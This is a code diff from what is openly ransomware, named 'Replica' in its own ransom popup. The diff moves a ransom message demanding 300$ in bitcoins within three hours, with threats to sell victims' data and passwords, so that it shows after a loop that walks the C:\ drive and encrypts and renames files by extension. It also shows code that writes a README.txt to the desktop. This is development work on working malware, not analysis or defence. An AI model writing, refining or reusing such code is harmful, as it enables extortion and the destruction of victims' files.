@@ -29,16 +29,6 @@ conn.commit()
 # Get base file name
 name = path.basename(__file__)
 
-# Warning message
-MessageBox(
-    "All of your important files have been encrypted\n"
-    "you have 3 hours to send 300$ in bitcoins to this address -> cooladdress.org.\n"
-    "If you will not, all of your important data will be sold, all of your password, wil be sold\n"
-    "Good luck.",
-    "Replica",
-    MB_ICONWARNING
-)
-
 # Extensions to encrypt
 extensions = get_extensions()
 
@@ -68,6 +58,16 @@ for root, dirs, files in walk("C:\\"):
                 rename(fpath, newpath)
             except:
                 pass
+
+# Warning message
+MessageBox(
+    "All of your important files have been encrypted\n"
+    "you have 3 hours to send 300$ in bitcoins to this address -> cooladdress.org.\n"
+    "If you will not, all of your important data will be sold, all of your password, wil be sold\n"
+    "Good luck.",
+    "Replica",
+    MB_ICONWARNING
+)
 
 # Writing backup instructions file
 desktop = f"C:/Users/{getuser()}/Desktop/README.txt"
